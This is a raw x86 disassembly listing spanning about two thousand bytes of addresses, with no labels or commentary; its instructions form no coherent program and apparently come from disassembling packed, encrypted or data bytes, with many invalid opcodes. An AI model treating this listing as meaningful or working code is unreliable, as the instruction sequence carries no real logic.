  41269f:	mul    BYTE PTR [esi-0x76]
  4126a2:	xchg   esi,eax
  4126a3:	int    0x89
  4126a5:	scas   al,BYTE PTR es:[edi]
  4126a6:	dec    ecx
  4126a7:	in     al,0xcb
  4126a9:	dec    esp
  4126aa:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4126ac:	mov    esi,0xcc24f5db
  4126b1:	sbb    DWORD PTR [edi+0xa],ecx
  4126b4:	shl    BYTE PTR [ebp-0x7391349c],cl
  4126ba:	jecxz  0x412731
  4126bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126bd:	sbb    eax,0x615a6752
  4126c2:	push   ecx
  4126c3:	lahf   
  4126c4:	outs   dx,DWORD PTR ds:[esi]
  4126c5:	ret    0xc664
  4126c8:	(bad)  
  4126c9:	mov    al,0x1b
  4126cb:	mov    dl,0xd0
  4126cd:	add    ah,ch
  4126cf:	or     bh,cl
  4126d1:	add    edi,DWORD PTR [edx+0x47]
  4126d4:	jo     0x4126a7
  4126d6:	sub    BYTE PTR [esi+0x32fbdd4a],bh
  4126dc:	gs inc ecx
  4126de:	stc    
  4126df:	loopne 0x412704
  4126e1:	ins    BYTE PTR es:[edi],dx
  4126e2:	lea    ebx,[ecx+0x75]
  4126e5:	icebp  
  4126e6:	mov    ebp,0x92b573c0
  4126eb:	cs aam 0x2c
  4126ee:	cwde   
  4126ef:	lds    ebx,FWORD PTR [esi-0x10]
  4126f2:	mov    al,ds:0x3c9b2770
  4126f7:	test   al,0x35
  4126f9:	inc    eax
  4126fa:	mov    edi,0x583a22b6
  4126ff:	scas   eax,DWORD PTR es:[edi]
  412700:	jg     0x4126f4
  412702:	inc    ebp
  412703:	add    DWORD PTR [esi-0x27],edx
  412706:	adc    BYTE PTR [edx-0x5b],bh
  412709:	sub    dh,dh
  41270b:	int3   
  41270c:	out    dx,al
  41270d:	dec    ebx
  41270e:	pcmpgtw mm3,QWORD PTR [eax-0x6596fe3e]
  412715:	js     0x4126c7
  412717:	in     eax,0xdc
  412719:	loop   0x412763
  41271b:	jbe    0x412781
  41271d:	add    DWORD PTR [ebx],edi
  41271f:	mov    eax,ds:0xe797edd1
  412724:	dec    eax
  412725:	or     edi,DWORD PTR [edx+0x4b61c020]
  41272b:	pop    esp
  41272c:	retf   
  41272d:	fwait
  41272e:	in     al,0x5f
  412730:	sti    
  412731:	cwde   
  412732:	inc    edi
  412733:	or     al,0x77
  412735:	xor    ecx,DWORD PTR [eax-0x659e37d0]
  41273b:	and    DWORD PTR [ecx-0x3ce3c2f0],esi
  412741:	or     al,0x11
  412743:	icebp  
  412744:	add    al,0xc6
  412746:	adc    dl,BYTE PTR [esi-0x6a]
  412749:	mov    esp,0x8dc5ec5c
  41274e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41274f:	push   ds
  412750:	adc    al,BYTE PTR [esi]
  412752:	stos   BYTE PTR es:[edi],al
  412753:	ds or  eax,0x4a06bcb3
  412759:	and    eax,0x2b522742
  41275e:	or     al,0x9c
  412760:	sbb    edi,esi
  412762:	popf   
  412763:	push   edi
  412764:	sti    
  412765:	stos   BYTE PTR es:[edi],al
  412766:	js     0x4126f5
  412768:	mov    dh,0xe9
  41276a:	push   cs
  41276b:	stos   DWORD PTR es:[edi],eax
  41276c:	aam    0xb1
  41276e:	push   es
  41276f:	pop    ss
  412770:	pop    ds
  412771:	enter  0xc6d4,0x31
  412775:	pop    ds
  412776:	iret   
  412777:	inc    ebx
  412778:	inc    ebx
  412779:	fidiv  WORD PTR [esi+0x2374119]
  41277f:	pop    ss
  412780:	(bad)  
  412781:	pop    ds
  412782:	je     0x4127b2
  412784:	imul   edi,DWORD PTR [edx-0x18],0xffffffc6
  412788:	or     dh,BYTE PTR [ebx+edx*1+0x54]
  41278c:	dec    edx
  41278d:	mov    al,0x5c
  41278f:	mov    ds:0x9f5e6881,eax
  412794:	ror    BYTE PTR [eax],1
  412796:	push   es
  412797:	cmp    eax,0xb5823443
  41279c:	jno    0x41278f
  41279e:	out    0x90,al
  4127a0:	adc    ch,0xac
  4127a3:	retf   
  4127a4:	in     eax,0x28
  4127a6:	fistp  DWORD PTR [edi+0x5d]
  4127a9:	and    esi,ebp
  4127ab:	mov    ecx,0xe494de72
  4127b0:	pop    ss
  4127b1:	je     0x412795
  4127b3:	mov    eax,ds:0x9280af8e
  4127b8:	or     eax,0x696ecbd4
  4127bd:	push   ebp
  4127be:	sbb    ebp,eax
  4127c0:	pop    ds
  4127c1:	jge    0x412829
  4127c3:	push   edi
  4127c4:	add    eax,0xe1de5e6d
  4127c9:	addr16 push 0x7cd8623
  4127cf:	cmp    DWORD PTR [eax+0x61],ecx
  4127d2:	lods   al,BYTE PTR ds:[esi]
  4127d3:	push   ss
  4127d4:	or     al,BYTE PTR [edi+edi*8-0x23608621]
  4127db:	cmp    ecx,ebx
  4127dd:	pusha  
  4127de:	add    BYTE PTR [ebp+0xe141f40],ch
  4127e4:	xchg   esi,eax
  4127e5:	cld    
  4127e6:	pop    edx
  4127e7:	out    0xb8,eax
  4127e9:	repnz test BYTE PTR [ebx-0x2e],dh
  4127ed:	inc    edi
  4127ee:	and    ch,bl
  4127f0:	cdq    
  4127f1:	leave  
  4127f2:	ret    0x6248
  4127f5:	aas    
  4127f6:	out    0x9b,eax
  4127f8:	dec    eax
  4127f9:	xlat   BYTE PTR ds:[ebx]
  4127fa:	ja     0x4127cf
  4127fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127fd:	dec    eax
  4127fe:	push   esp
  4127ff:	and    BYTE PTR [edx+0xde20b8d],cl
  412805:	push   ss
  412806:	push   ecx
  412807:	jmp    0x36d8a44b
  41280c:	inc    ebp
  41280d:	push   edi
  41280e:	xchg   edi,eax
  41280f:	xor    esp,DWORD PTR [eax+edx*8-0x1c]
  412813:	call   0x1b3:0x404a4dfb
  41281a:	stos   BYTE PTR es:[edi],al
  41281b:	fisubr DWORD PTR [esi]
  41281d:	xlat   BYTE PTR ds:[ebx]
  41281e:	cmc    
  41281f:	sbb    BYTE PTR [ebp-0x71c03780],0x21
  412826:	inc    ebp
  412827:	xor    DWORD PTR [ebx-0x64],esp
  41282a:	repz pop esi
  41282c:	pop    ebx
  41282d:	(bad)  
  41282e:	jmp    0xfca03ed9
  412833:	dec    ebp
  412834:	outs   dx,BYTE PTR ds:[esi]
  412835:	push   ecx
  412836:	pop    esi
  412837:	xchg   edi,eax
  412838:	xor    dl,BYTE PTR [edx]
  41283a:	pop    ebx
  41283b:	or     ebp,DWORD PTR [esi]
  41283d:	hlt    
  41283e:	in     al,0x41
  412840:	imul   ebp,DWORD PTR [edi+0x224a5478],0xffffffd7
  412847:	jbe    0x4127f2
  412849:	add    al,0xa4
  41284b:	push   ds
  41284c:	and    dl,BYTE PTR [ebp-0x7ef13abc]
  412852:	fcomp  DWORD PTR [edx+eiz*8+0x6dd88ea0]
  412859:	jno    0x41289b
  41285b:	mov    esp,0xd5cd6f5d
  412860:	addr16 or eax,0xb553c62a
  412866:	cmp    esi,ebx
  412868:	fwait
  412869:	cs out 0x5c,eax
  41286c:	jmp    0xe4624b06
  412871:	cmc    
  412872:	jp     0x4128ed
  412874:	adc    ah,dh
  412876:	jns    0x412831
  412878:	xchg   BYTE PTR [ebx-0x10ff6fc5],ah
  41287e:	aad    0x5b
  412880:	cmp    eax,0xde778486
  412885:	add    eax,0x7fd412b
  41288a:	and    eax,0x91723f39
  41288f:	pop    ebx
  412890:	ds jo  0x412854
  412893:	in     eax,0x9a
  412895:	scas   al,BYTE PTR es:[edi]
  412896:	jg     0x412851
  412898:	ret    
  412899:	adc    BYTE PTR [ecx-0x40],dh
  41289c:	mov    WORD PTR [esi+0x26],ds
  41289f:	jns    0x412837
  4128a1:	call   0xdfb:0x4479da55
  4128a8:	fild   WORD PTR [eax-0x56135457]
  4128ae:	movaps XMMWORD PTR [eax-0x15],xmm1
  4128b2:	push   ds
  4128b3:	lds    edx,FWORD PTR ds:0x16a9fdbb
  4128b9:	aad    0xec
  4128bb:	dec    esi
  4128bc:	int    0x5d
  4128be:	mov    ebp,0x7383f88b
  4128c3:	push   ebp
  4128c4:	push   ecx
  4128c5:	mov    eax,ds:0xa7621b9c
  4128ca:	cmp    al,0xc3
  4128cc:	nop
  4128cd:	pop    eax
  4128ce:	ret    
  4128cf:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4128d1:	push   0xf99f67a9
  4128d6:	and    BYTE PTR [ecx-0x1519309b],ch
  4128dc:	call   0x3781dc27
  4128e1:	jns    0x412961
  4128e3:	pusha  
  4128e4:	add    eax,0xf2439a94
  4128e9:	pusha  
  4128ea:	retf   0x965c
  4128ed:	div    DWORD PTR [esi-0x44]
  4128f0:	add    BYTE PTR [edx],0x95
  4128f3:	push   ebx
  4128f4:	push   edx
  4128f5:	lds    eax,FWORD PTR [edx-0x4f]
  4128f8:	aad    0xc7
  4128fa:	mov    ah,BYTE PTR [eax+0x2e960146]
  412900:	pop    edx
  412901:	outs   dx,BYTE PTR ds:[esi]
  412902:	test   ebp,ecx
  412904:	and    BYTE PTR [eax],ch
  412906:	jb     0x4128fc
  412908:	mov    ecx,0x9980864b
  41290d:	das    
  41290e:	ret    0x2cd9
  412911:	leave  
  412912:	sbb    al,0x7a
  412914:	cmp    cl,0x7d
  412917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412918:	jb     0x412910
  41291a:	sbb    eax,0x4a1473fd
  41291f:	sbb    BYTE PTR [ebp-0x39],dl
  412922:	hlt    
  412923:	add    eax,0x18dcbcf5
  412928:	dec    edi
  412929:	repz scas al,BYTE PTR es:[edi]
  41292b:	jge    0x4128e7
  41292d:	clc    
  41292e:	mov    bh,0x4d
  412930:	jge    0x412994
  412932:	xchg   ebp,eax
  412933:	stos   BYTE PTR es:[edi],al
  412934:	out    dx,al
  412935:	dec    edi
  412936:	cwde   
  412937:	xor    al,0xaf
  412939:	das    
  41293a:	inc    esi
  41293b:	push   es
  41293c:	repz dec edx
  41293e:	xor    eax,edi
  412940:	(bad)  
  412942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412943:	pop    eax
  412944:	in     al,dx
  412945:	fucomp st(6)
  412947:	enter  0x9416,0xe3
  41294b:	jmp    DWORD PTR [ecx-0x41]
  41294e:	(bad)  
  41294f:	inc    edi
  412950:	push   cs
  412951:	inc    esp
  412952:	mov    ebx,DWORD PTR [eax+0x47ed519a]
  412958:	outs   dx,BYTE PTR ds:[esi]
  412959:	adc    al,0x80
  41295b:	xchg   ebp,eax
  41295c:	int    0x15
  41295e:	dec    ebp
  41295f:	mov    al,ds:0x77c6b49f
  412964:	arpl   WORD PTR [edi+0x3ed102a5],bx
  41296a:	int    0xe9
  41296c:	xlat   BYTE PTR ds:[ebx]
  41296d:	jl     0x4129b6
  41296f:	sahf   
  412970:	xchg   esi,eax
  412971:	shl    BYTE PTR [ebp-0x20],0x89
  412975:	(bad)  
  412976:	adc    esp,edx
  412978:	ds mov ah,0xb4
  41297b:	or     al,0xcf
  41297d:	outs   dx,DWORD PTR ds:[esi]
  41297e:	leave  
  41297f:	out    dx,al
  412980:	push   edi
  412981:	cmp    ebp,0x90b8e40a
  412987:	icebp  
  412988:	xchg   esp,eax
  412989:	inc    edi
  41298a:	inc    edi
  41298b:	lahf   
  41298c:	cdq    
  41298d:	mov    edi,0xd2d3ab9c
  412992:	stc    
  412993:	shl    ecx,1
  412995:	jge    0x412a0f
  412997:	cld    
  412998:	fld    DWORD PTR [ecx+edi*4]
  41299b:	mov    DWORD PTR [eax+0x31422157],esp
  4129a1:	push   esp
  4129a2:	jmp    0x3a6e:0x2047d26b
  4129a9:	test   eax,0x25962157
  4129ae:	cmp    al,0x27
  4129b0:	(bad)  [esi]
  4129b2:	sbb    dl,dh
  4129b4:	and    edi,DWORD PTR [ecx]
  4129b6:	add    BYTE PTR [edi],bh
  4129b8:	mov    ch,0x2c
  4129ba:	popa   
  4129bb:	jl     0x4129a3
  4129bd:	mov    edi,0x18bd727a
  4129c2:	push   eax
  4129c3:	(bad)  
  4129c4:	cmp    BYTE PTR [ecx-0x4c90b640],ah
  4129ca:	mov    edx,DWORD PTR [eax]
  4129cc:	and    bh,0x88
  4129cf:	adc    BYTE PTR [eax],ch
  4129d1:	mov    edi,0xe6202d05
  4129d6:	push   0x77338fc9
  4129db:	sti    
  4129dc:	mov    edx,0xbf684597
  4129e1:	or     eax,0x6658feb3
  4129e6:	nop
  4129e7:	ins    DWORD PTR es:[edi],dx
  4129e8:	mov    eax,ds:0x2c8081c4
  4129ed:	jns    0x4129c9
  4129ef:	cmp    bl,ch
  4129f1:	xchg   BYTE PTR [esi],al
  4129f3:	in     eax,dx
  4129f4:	jae    0x412a01
  4129f6:	xchg   BYTE PTR [ebp-0x2b553575],bl
  4129fc:	leave  
  4129fd:	popf   
  4129fe:	ja     0x4129bb
  412a00:	scas   al,BYTE PTR es:[edi]
  412a01:	mov    edi,0x946ff9cd
  412a06:	xor    al,0xe7
  412a08:	xchg   ebx,eax
  412a09:	jo     0x4129a3
  412a0b:	jle    0x4129dc
  412a0d:	mov    al,0x95
  412a0f:	dec    edi
  412a10:	lea    esi,[edi+0x12]
  412a13:	sbb    eax,0x22a3adf6
  412a18:	scas   eax,DWORD PTR es:[edi]
  412a19:	jge    0x412a32
  412a1b:	sbb    eax,DWORD PTR [ebx-0x58]
  412a1e:	pop    edx
  412a1f:	jae    0x4129fd
  412a21:	mov    BYTE PTR ds:0x3d32bad6,cl
  412a27:	stos   DWORD PTR es:[edi],eax
  412a28:	popf   
  412a29:	mov    bh,0xca
  412a2b:	and    cl,dl
  412a2d:	cmp    BYTE PTR [edx],al
  412a2f:	fwait
  412a30:	popa   
  412a31:	push   es
  412a32:	mov    al,ds:0x28829dc5
  412a37:	jmp    0x5d589682
  412a3c:	ja     0x412aa1
  412a3e:	xchg   esp,ecx
  412a40:	push   ds
  412a41:	sbb    BYTE PTR [ebx-0x33],dl
  412a44:	ins    BYTE PTR es:[edi],dx
  412a45:	and    ecx,DWORD PTR [ecx+0x4c]
  412a48:	mov    dl,0xd8
  412a4a:	jno    0x4129da
  412a4c:	daa    
  412a4d:	cmp    edx,DWORD PTR [esi-0x4b]
  412a50:	sbb    bh,BYTE PTR [edx]
  412a52:	mov    ebp,0x7ca7c9b0
  412a57:	dec    esi
  412a58:	into   
  412a59:	mov    bh,0xf7
  412a5b:	fs pop ecx
  412a5d:	jge    0x412aa0
  412a5f:	mov    esp,0x83b21ada
  412a64:	dec    edi
  412a65:	mov    ds:0x3666fb2b,al
  412a6a:	push   edi
  412a6b:	imul   DWORD PTR [edi]
  412a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a6e:	aas    
  412a6f:	div    DWORD PTR [ebp+0x6f]
  412a72:	dec    ebx
  412a73:	(bad)  
  412a75:	inc    ecx
  412a76:	cs sub al,0xe0
  412a79:	mov    ds:0x98c18001,al
  412a7e:	add    DWORD PTR [edi-0x37cab76],esi
  412a84:	jbe    0x412af7
  412a86:	jg     0x412a91
  412a88:	scas   al,BYTE PTR es:[edi]
  412a89:	and    BYTE PTR [ecx+edi*8+0x1c8f51ec],0xe9
  412a91:	mov    ebp,0x3b575aba
  412a96:	push   ebx
  412a97:	and    eax,0xac2a86c3
  412a9c:	cmp    dh,cl
  412a9e:	dec    esi
  412a9f:	(bad)  
  412aa0:	ss cs sti 
  412aa3:	cmp    ch,BYTE PTR [ecx]
  412aa5:	push   ss
  412aa6:	cmp    BYTE PTR [ecx],al
  412aa8:	das    
  412aa9:	mov    eax,0x6d1671ef
  412aae:	arpl   bx,cx
  412ab0:	shl    BYTE PTR [edi+esi*8+0xe73b1de],0x7e
  412ab8:	fidiv  WORD PTR [esi]
  412aba:	sti    
  412abb:	ss add eax,0x88bb369c
  412ac1:	fwait
  412ac2:	and    ch,ah
  412ac4:	out    0x44,eax
  412ac6:	call   0xcd8ca7c3
  412acb:	das    
  412acc:	xchg   ebp,eax
  412acd:	sub    esp,DWORD PTR [edx-0x70088300]
  412ad3:	add    bh,BYTE PTR [esi]
  412ad5:	or     bl,BYTE PTR [edx]
  412ad7:	sub    DWORD PTR [ebx],ebx
  412ad9:	mov    ecx,0x8500115a
  412ade:	scas   eax,DWORD PTR es:[edi]
  412adf:	and    edi,DWORD PTR [ecx-0x41d583e1]
  412ae5:	test   eax,0xbd613037
  412aea:	adc    al,0x45
  412aec:	daa    
  412aed:	lds    esp,FWORD PTR [ebp+0x5aa8b21d]
  412af3:	add    dl,BYTE PTR ds:0x8945fadd
  412af9:	ror    ch,0x66
  412afc:	mov    ds:0x97934eab,al
  412b01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b02:	and    eax,0x62ad92e9
  412b07:	mov    ebp,0xb4683d51
  412b0c:	addr16 push edx
  412b0e:	xor    ecx,DWORD PTR [ecx+esi*8+0x3e]
  412b12:	leave  
  412b13:	scas   eax,DWORD PTR es:[edi]
  412b14:	(bad)  
  412b15:	mov    edx,0xab318b99
  412b1a:	test   bh,bh
  412b1c:	aad    0x75
  412b1e:	ja     0x412b70
  412b20:	sub    BYTE PTR [edi-0x7f],bl
  412b23:	jmp    0x412b68
  412b25:	je     0x412b54
  412b27:	inc    eax
  412b28:	inc    edx
  412b29:	sbb    DWORD PTR [edx-0x16e6c5d7],esp
  412b2f:	dec    esi
  412b30:	sbb    edx,DWORD PTR [edi-0x49]
  412b33:	shl    BYTE PTR [esi+0x7a],cl
  412b36:	lock scas al,BYTE PTR es:[edi]
  412b38:	mov    edx,0xdf5671ba
  412b3d:	ins    BYTE PTR es:[edi],dx
  412b3e:	into   
  412b3f:	mov    cl,0xbf
  412b41:	arpl   cx,ax
  412b43:	hlt    
  412b44:	jb     0x412b73
  412b46:	mov    edi,0xd42faa60
  412b4b:	adc    BYTE PTR [ecx],dh
  412b4d:	pushf  
  412b4e:	pushf  
  412b4f:	and    dl,BYTE PTR [edi-0x62]
  412b52:	jle    0x412bd0
  412b54:	push   ss
  412b55:	mov    ecx,0xaf429637
  412b5a:	imul   BYTE PTR [edi+0x68]
  412b5d:	mov    al,ds:0x4aa2fd35
  412b62:	xchg   edi,eax
  412b63:	jmp    0x412b14
  412b65:	sub    al,0x3a
  412b67:	call   0x3a1d:0xd2fa9a10
  412b6e:	and    al,0xec
  412b70:	fistp  DWORD PTR [edi+0x34919855]
  412b76:	sub    edi,DWORD PTR [ecx]
  412b78:	or     BYTE PTR [eax-0x2f2dea0d],cl
  412b7e:	xchg   esi,eax
  412b7f:	mov    ds:0x3a968777,al
  412b84:	jbe    0x412bf2
  412b86:	push   ebx
  412b88:	ficomp WORD PTR [edx-0x64]
  412b8b:	lea    esp,[edi+0x6a]
  412b8e:	scas   eax,DWORD PTR es:[edi]
  412b8f:	ds dec ecx
  412b91:	and    eax,0xbc237984
  412b96:	pop    ss
  412b97:	xor    DWORD PTR [ecx+0x1],ebp
  412b9a:	es push 0xdf497412
  412ba0:	cmp    al,0x6b
  412ba2:	addr16 sahf 
  412ba4:	lods   al,BYTE PTR cs:[esi]
  412ba6:	nop
  412ba7:	in     eax,dx
  412ba8:	dec    eax
  412ba9:	add    ch,BYTE PTR [edx-0x7e5ac192]
  412baf:	push   edi
  412bb0:	retf   
  412bb1:	popf   
  412bb2:	or     dh,bh
  412bb4:	pop    ecx
  412bb5:	(bad)  
  412bb6:	xor    eax,0xe270d6fd
  412bbb:	clc    
  412bbc:	aaa    
  412bbd:	fsub   DWORD PTR [edi-0x1e58b26f]
  412bc3:	or     BYTE PTR [edi+0x6c],0xfb
  412bc7:	fwait
  412bc8:	jbe    0x412c07
  412bca:	loope  0x412baf
  412bcc:	test   BYTE PTR es:[edx-0x25],dh
  412bd0:	sahf   
  412bd1:	sub    al,0x3e
  412bd3:	pop    edx
  412bd4:	cmc    
  412bd5:	add    eax,0x1d4edff6
  412bda:	dec    edx
  412bdb:	jbe    0x412c31
  412bdd:	shr    ebx,cl
  412bdf:	stos   DWORD PTR es:[edi],eax
  412be0:	adc    DWORD PTR [ebp-0x6f],ebx
  412be3:	mov    ds,esi
  412be5:	jecxz  0x412c06
  412be7:	inc    ebp
  412be8:	sahf   
  412be9:	repz hlt 
  412beb:	and    al,0x8b
  412bed:	xchg   ecx,eax
  412bee:	in     al,dx
  412bef:	scas   al,BYTE PTR es:[edi]
  412bf0:	out    0xb6,al
  412bf2:	add    eax,0xffffff9c
  412bf5:	sbb    DWORD PTR [ebx+ebp*8],ebp
  412bf8:	stc    
  412bf9:	mov    DWORD PTR [ebx-0x62],eax
  412bfc:	aas    
  412bfd:	fimul  WORD PTR [eax]
  412bff:	jne    0x412b91
  412c01:	cwde   
  412c02:	imul   ecx,DWORD PTR [ebx+0x322129f7],0x365c703a
  412c0c:	jae    0x412c77
  412c0e:	imul   BYTE PTR cs:[ebx-0x28]
  412c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c13:	dec    esi
  412c14:	cli    
  412c15:	mov    ebx,0x433074d
  412c1a:	fisub  DWORD PTR [ebx-0x3dd8eae3]
  412c20:	into   
  412c21:	sub    bl,dl
  412c23:	pushf  
  412c24:	mov    edi,0x293e4c0b
  412c29:	fisttp WORD PTR [ecx+0x7c]
  412c2c:	enter  0x4e7b,0xaf
  412c30:	test   al,0x98
  412c32:	cmp    dh,BYTE PTR [ebp-0x648ce4af]
  412c38:	dec    edx
  412c39:	rcl    ah,1
  412c3b:	loopne 0x412bc5
  412c3d:	and    BYTE PTR [edx+0x51cbcec4],dl
  412c43:	shl    esi,cl
  412c45:	(bad)  
  412c46:	ds mov dh,0xe0
  412c49:	sbb    DWORD PTR [edi-0x9],ebx
  412c4c:	sbb    eax,0x81f4d1f4
  412c51:	mov    edx,0x2ba21e0e
  412c56:	mov    ds:0x91af71ad,eax
  412c5b:	sub    al,0x3a
  412c5d:	pop    esp
  412c5e:	inc    esp
  412c5f:	and    bl,ah
  412c61:	nop
  412c62:	push   cs
  412c63:	xor    al,0xeb
  412c65:	mov    cl,0x9b
  412c67:	and    al,0xb6
  412c69:	xchg   ebx,eax
  412c6a:	sbb    BYTE PTR [ebp-0x3d],cl
  412c6d:	sti    
  412c6e:	inc    edx
  412c6f:	pop    ss
  412c70:	ins    DWORD PTR es:[edi],dx
  412c71:	sub    DWORD PTR [esi],ecx
  412c73:	out    0x56,al
  412c75:	xchg   ecx,eax
  412c76:	in     al,0x52
  412c78:	fst    QWORD PTR [edx-0x28333248]
  412c7e:	mov    ah,0x68
  412c80:	daa    
  412c81:	pop    esi
  412c82:	xchg   edx,eax
  412c83:	aaa    
  412c84:	sub    edx,DWORD PTR [ecx]
  412c86:	(bad)
  412c89:	mov    al,ds:0xb5517019
  412c8e:	xchg   BYTE PTR [ecx+0x11],bh
  412c91:	mov    BYTE PTR [esi-0x51537389],dh
  412c97:	aam    0xca
  412c99:	int    0x41
  412c9b:	sbb    ch,ah
  412c9d:	dec    esi
  412c9e:	cmp    cl,al
  412ca0:	retf   
  412ca1:	ret    0x173c
  412ca4:	ds sbb al,0x6a
  412ca7:	adc    eax,0x312548ab
  412cac:	fiadd  WORD PTR [ecx+0x58]
  412caf:	std    
  412cb0:	sbb    ah,BYTE PTR [ebx-0xf]
  412cb3:	js     0x412c75
  412cb5:	shl    BYTE PTR [esi],cl
  412cb7:	stos   BYTE PTR es:[edi],al
  412cb8:	jmp    0xe1da:0x319d91e4
  412cbf:	xchg   dh,bl
  412cc1:	or     edx,DWORD PTR [ebx*8+0x2c3472f7]
  412cc8:	jne    0x412d04
  412cca:	dec    esi
  412ccb:	push   edi
  412ccc:	or     DWORD PTR [edx-0x7a],edx
  412ccf:	dec    ebp
  412cd0:	test   BYTE PTR [ecx+0x7dcb570],al
  412cd6:	pop    edi
  412cd7:	mov    ah,0x8
  412cd9:	(bad)  
  412cda:	pop    esi
  412cdb:	jp     0x412d49
  412cdd:	fiadd  DWORD PTR ds:0x66590cc2
  412ce3:	jge    0x412c92
  412ce5:	add    eax,0xdbf65be5
  412cea:	in     eax,0x44
  412cec:	ret    
  412ced:	pop    ebx
  412cee:	sub    al,al
  412cf0:	clc    
  412cf1:	or     ebx,esp
  412cf3:	adc    DWORD PTR [ecx+0x59],esp
  412cf6:	add    al,0xc7
  412cf8:	(bad)  
  412cf9:	mov    eax,0x8e58e350
  412cfe:	and    dl,BYTE PTR [esi-0x34]
  412d01:	adc    bl,BYTE PTR [edx]
  412d03:	mov    ah,0xe4
  412d06:	pop    es
  412d07:	fdiv   QWORD PTR [ebx+0x265bf859]
  412d0d:	sub    al,0xf
  412d0f:	or     al,0xee
  412d11:	mov    ds:0xe0a1ba6b,al
  412d16:	jmp    0x14b36d55
  412d1b:	push   ecx
  412d1c:	and    eax,0xcd8e71b1
  412d21:	popa   
  412d22:	out    dx,al
  412d23:	pop    ds
  412d24:	into   
  412d25:	in     eax,0x1e
  412d27:	(bad)  
  412d29:	test   eax,0xcf7928ce
  412d2e:	or     al,0x37
  412d30:	adc    DWORD PTR [eax],edi
  412d32:	iret   
  412d33:	push   0xfffffffa
  412d35:	or     esp,DWORD PTR [eax]
  412d37:	test   BYTE PTR [ecx*2-0x424209af],0x1b
  412d3f:	dec    ebx
  412d40:	dec    esp
  412d41:	out    dx,al
  412d42:	clc    
  412d43:	and    BYTE PTR [ecx-0x26ea8775],dl
  412d49:	xor    DWORD PTR [ebx],edx
  412d4b:	adc    al,0x93
  412d4d:	xor    esi,DWORD PTR [ebx-0x525206d1]
  412d53:	lods   al,BYTE PTR ds:[esi]
  412d54:	or     DWORD PTR [ebp-0x39480c5d],esp
  412d5a:	mov    al,ds:0x807fa032
  412d5f:	nop
  412d60:	jne    0x412d7d
  412d62:	dec    ebp
  412d63:	(bad)  
  412d64:	daa    
  412d65:	(bad)  
  412d66:	scas   al,BYTE PTR es:[edi]
  412d67:	cmp    dl,BYTE PTR [ebp+0x1359d2af]
  412d6d:	gs loopne 0x412d88
  412d70:	cmp    eax,0x316ae3ff
  412d75:	adc    BYTE PTR [esi+0x7f],dl
  412d78:	retf   0x501a
  412d7b:	es scas eax,DWORD PTR es:[edi]
  412d7d:	mov    al,0x68
  412d7f:	fidiv  WORD PTR [ebx+0x41]
  412d82:	add    dh,BYTE PTR [edi+0x777ba06e]
  412d88:	int3   
  412d89:	mov    al,0xf8
  412d8b:	stos   DWORD PTR es:[edi],eax
  412d8c:	push   ebp
  412d8d:	int    0xd9
  412d8f:	ins    BYTE PTR es:[edi],dx
  412d90:	mov    ds:0xf87111e6,eax
  412d95:	retf   0x71e0
  412d98:	sti    
  412d99:	lahf   
  412d9a:	push   0x4ac570af
  412d9f:	loop   0x412de3
  412da1:	data16 ja 0x412d75
  412da4:	aam    0xd2
  412da6:	clc    
  412da7:	lods   eax,DWORD PTR ds:[esi]
  412da8:	xchg   ebp,eax
  412da9:	sbb    edx,DWORD PTR [ebx-0x1f]
  412dac:	jno    0x412df6
  412dae:	enter  0xdb45,0x47
  412db2:	xchg   ebx,eax
  412db3:	cmp    ebx,DWORD PTR [eax+0x16]
  412db6:	je     0x412d56
  412db8:	and    al,0xd
  412dba:	cmp    esi,DWORD PTR [ecx+ebx*8-0x2bdea54f]
  412dc1:	cli    
  412dc2:	dec    edx
  412dc3:	mov    bh,0x2b
  412dc5:	xor    al,0x3a
  412dc7:	pop    ebp
  412dc8:	fdivr  st(5),st
  412dca:	pop    edi
  412dcb:	iret   
  412dcc:	in     al,0x81
  412dce:	mov    esp,ss
  412dd0:	aad    0xe2
  412dd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412dd3:	loopne 0x412e38
  412dd5:	mov    eax,0x158dc239
  412dda:	lds    edi,FWORD PTR [esi+eiz*2-0x273fdfc1]
  412de1:	retf   0x3d21
  412de4:	xchg   ecx,eax
  412de5:	dec    ecx
  412de6:	fldenv [esi+0x54]
  412de9:	jbe    0x412df0
  412deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dec:	fwait
  412ded:	das    
  412dee:	dec    esp
  412def:	xchg   esp,eax
  412df0:	cld    
  412df1:	jo     0x412d89
  412df3:	dec    BYTE PTR [edx-0x20cc60d6]
  412df9:	jp     0x412e07
  412dfb:	mov    cl,0x80
  412dfd:	xchg   ebp,eax
  412dfe:	sub    DWORD PTR gs:[ebp+0x7828e687],esi
  412e05:	xchg   bh,cl
  412e07:	xchg   BYTE PTR ds:0xcea72eb9,al
  412e0d:	inc    edx
  412e0e:	and    BYTE PTR gs:[ecx+0x35f53508],ch
  412e15:	xchg   esi,eax
  412e16:	mov    edx,0x98a67fda
  412e1b:	cli    
  412e1c:	in     eax,0x16
  412e1e:	stos   DWORD PTR es:[edi],eax
  412e1f:	sar    BYTE PTR ds:0xd6d78763,1
  412e25:	jae    0x412e7b
  412e27:	rcl    DWORD PTR [ecx],1
  412e29:	xchg   edx,eax
  412e2a:	or     BYTE PTR [ecx+edx*8+0x3a],dl
  412e2e:	mov    ecx,0xd0607f27
  412e33:	clc    
  412e34:	pop    ecx
  412e35:	hlt    
  412e36:	mov    ecx,0xa08bb29a
  412e3b:	retf   
  412e3c:	outs   dx,BYTE PTR ds:[esi]
  412e3d:	retf   0xf144
  412e40:	fs in  al,dx
  412e42:	pop    edi
  412e43:	pushf  
  412e44:	ror    BYTE PTR cs:[ecx+0x1bca8182],0x46
  412e4c:	je     0x412dd9
  412e4e:	push   ebx
  412e4f:	shl    DWORD PTR [edi],1
  412e51:	and    DWORD PTR [ecx+esi*4-0x48413447],eax
  412e58:	cdq    
  412e59:	fs leave 
  412e5b:	sti    
  412e5c:	cli    
  412e5d:	pop    ds
  412e5e:	add    ebp,ecx
